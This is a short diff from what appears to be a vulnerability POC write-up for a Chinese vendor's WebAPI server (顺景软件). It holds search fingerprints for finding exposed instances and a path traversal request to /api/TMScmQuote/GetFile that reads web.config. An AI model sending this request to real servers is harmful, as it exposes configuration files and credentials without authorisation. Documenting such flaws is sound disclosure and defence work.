@@ -9,7 +9,7 @@ body="/api/DBRecord/getDBRecords"
 body="顺景软件 WebAPI 服务端"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /api/TMScmQuote/GetFile?FullGuidFileName=/../web.config&FileName= HTTP/1.1
